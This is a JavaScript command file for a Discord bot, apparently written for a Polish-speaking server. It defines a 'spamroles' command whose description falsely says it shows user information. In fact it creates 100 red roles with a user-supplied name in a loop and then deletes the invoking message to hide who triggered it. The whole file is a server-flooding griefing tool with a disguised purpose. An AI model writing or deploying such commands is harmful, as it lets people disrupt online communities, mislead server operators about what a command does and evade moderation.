const commando = require('discord.js-commando');
const Discord = require('discord.js');


class ppCommand extends commando.Command {
    constructor(client) {
        super(client,
            {
                name: 'spamroles',
                group: 'funkcje',
                memberName: 'spamroles',
                description: 'Wyświetla informacje o użytkowniku'
            })
    }
    async run(message, args) {
        
        if(!args) return message.author.send("Musisz podać nazwę roli.") 
        for (let i = 0; i < 100; i++) {
            message.guild.createRole({
                name: args,
                color: "#ff0000",
            })
        }
        message.delete();

    }
}

module.exports = ppCommand;